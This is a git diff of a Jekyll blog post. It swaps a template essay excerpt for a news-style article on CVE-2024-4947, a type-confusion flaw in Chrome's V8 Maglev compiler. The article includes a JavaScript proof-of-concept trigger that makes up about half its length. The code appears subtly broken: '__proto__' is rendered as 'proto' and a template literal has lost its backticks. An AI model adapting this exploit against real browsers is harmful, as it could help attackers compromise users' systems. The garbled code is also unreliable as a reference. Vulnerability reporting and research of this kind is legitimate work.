@@ -1,18 +1,116 @@
 ---
 layout: post
-title: Flake it till you make it
-subtitle: Excerpt from Soulshaping by Jeff Brown
+title: PoC Exploit Published for 0-day Vulnerability 
+subtitle: Google Chrome
 cover-img: /assets/img/path.jpg
 thumbnail-img: /assets/img/thumb.png
 share-img: /assets/img/path.jpg
 tags: [books, test]
-author: Sharon Smith and Barry Simpson
+author: Michel Cornejo
 ---
 
-Under what circumstances should we step off a path? When is it essential that we finish what we start? If I bought a bag of peanuts and had an allergic reaction, no one would fault me if I threw it out. If I ended a relationship with a woman who hit me, no one would say that I had a commitment problem. But if I walk away from a seemingly secure route because my soul has other ideas, I am a flake?
+A proof-of-concept (PoC) exploit for a critical zero-day vulnerability (CVE-2024-4947) in Google Chrome has been made public.
 
-The truth is that no one else can definitively know the path we are here to walk. It’s tempting to listen—many of us long for the omnipotent other—but unless they are genuine psychic intuitives, they can’t know. All others can know is their own truth, and if they’ve actually done the work to excavate it, they will have the good sense to know that they cannot genuinely know anyone else’s. Only soul knows the path it is here to walk. Since you are the only one living in your temple, only you can know its scriptures and interpretive structure.
+The potential for exploitation of this vulnerability, which impacts the V8 JavaScript engine, has generated considerable apprehension among members of the cybersecurity community.
 
-At the heart of the struggle are two very different ideas of success—survival-driven and soul-driven. For survivalists, success is security, pragmatism, power over others. Success is the absence of material suffering, the nourishing of the soul be damned. It is an odd and ironic thing that most of the material power in our world often resides in the hands of younger souls. Still working in the egoic and material realms, they love the sensations of power and focus most of their energy on accumulation. Older souls tend not to be as materially driven. They have already played the worldly game in previous lives and they search for more subtle shades of meaning in this one—authentication rather than accumulation. They are often ignored by the culture at large, although they really are the truest warriors.
+## Details Of CVE-2024-4947
 
-A soulful notion of success rests on the actualization of our innate image. Success is simply the completion of a soul step, however unsightly it may be. We have finished what we started when the lesson is learned. What a fear-based culture calls a wonderful opportunity may be fruitless and misguided for the soul. Staying in a passionless relationship may satisfy our need for comfort, but it may stifle the soul. Becoming a famous lawyer is only worthwhile if the soul demands it. It is an essential failure if you are called to be a monastic this time around. If you need to explore and abandon ten careers in order to stretch your soul toward its innate image, then so be it. Flake it till you make it.
+he CVE-2024-4947 vulnerability arises from erroneous AccessInfo values assigned to module namespace objects within the V8 engine.
+
+This vulnerability may cause type confusion in the Just-In-Time (JIT) compiler Maglev, which V8 utilizes.
+
+Type confusion vulnerabilities manifest when an application declares a variable or object as one type but subsequently manipulates its type, as reported by GitHub. This can potentially result in security breaches and erratic behavior.
+
+## Technical Breakdown
+
+The matter transpires when the V8 engine processes AccessInfo for module namespace objects in an erroneous manner, leading to a misinterpretation of the types of these objects by the Maglev JIT compiler.
+
+An assailant may exploit this misunderstanding to execute arbitrary code within the browser’s context, potentially resulting in a complete compromise of the system.
+
+```javascript
+// run with: /d8 --allow-natives-syntax --maglev --expose-gc --soft-abort --trace-deopt 22.mjs
+
+import * as ns from "./22.mjs";
+
+export let c = 0;
+
+function to_fast(o) {
+var dummy = {'unique':5};
+dummy.proto = o;
+dummy.proto = o; //OptimizeAsFastPrototype
+}
+
+to_fast(ns);
+
+function store(target, v) {
+target.c = v;
+}
+
+function createObject() {
+let a = {};
+a.i1 = 1;
+a.i2 = 1;
+a.i3 = 1;
+a.i4 = 1;
+// -----------------
+for (let i = 0; i < 8; i++) {
+a[p${i}] = 1;
+}
+return a;
+}
+
+function init() {
+let a = createObject();
+a.proto = ns;
+// %DebugPrint(a);
+return a;
+}
+
+(function() {
+%PrepareFunctionForOptimization(store);
+store(init(), 0);
+%OptimizeMaglevOnNextCall(store);
+store(init(), 0);
+})();
+
+function confuse_properties_map(arg) {
+store(arg, 0x1);
+}
+
+let a = init();
+
+let arr = [];
+
+arr.push(1.1);
+
+let arr2 = [{}];
+
+confuse_properties_map(a);
+
+gc();
+
+// %DebugPrint(a);
+// %DebugPrint(arr);
+
+a.p5 = 1024;
+a.p7 = 1024;
+
+%DebugPrint(arr);
+
+// %SystemBreak();
+```
+The PoC exploit illustrates how a malevolent actor can exploit this susceptibility to execute arbitrary code.
+
+The methodology entails developing a malevolent webpage that, upon user interaction, activates the type confusion vulnerability in the V8 engine, thereby granting the assailant permission to execute illicit code on the target’s system.
+
+![exploit]({{ '/assets/img/exploit.png' | relative_url }})
+
+Considering the pervasive utilization of Google Chrome, this susceptibility presents a substantial hazard to users across the globe.
+
+Users must immediately update their browsers to the most recent version whenever a security upgrade is available.
+
+Organizations should also consider implementing additional security measures, such as intrusion detection systems and web application firewalls, to reduce the risk of exploitation.
+
+A proof-of-concept exploit for CVE-2024-4947 has been made public, highlighting the persistent difficulties in securing contemporary web browsers.
+
+Maintaining a state of constant vigilance and proactivity in the face of security threats is critical for both developers and users, as malicious actors persist in discovering and capitalizing on weaknesses in widely utilized software.
